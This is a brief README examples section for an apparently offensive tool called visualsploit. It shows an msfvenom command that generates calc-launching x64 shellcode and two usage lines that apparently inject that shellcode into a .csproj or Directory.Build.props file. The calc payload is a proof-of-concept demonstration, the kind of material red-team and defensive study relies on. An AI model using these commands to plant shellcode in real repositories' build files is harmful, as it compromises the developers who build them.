# Examples

`calc.bin` is a small x64 shellcode that launches `calc.exe`. Generated with:

```bash
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f raw -o calc.bin
```

Usage:

```bash
visualsploit Sample.csproj calc.bin -s 42
visualsploit path/to/repo/Directory.Build.props calc.bin
```
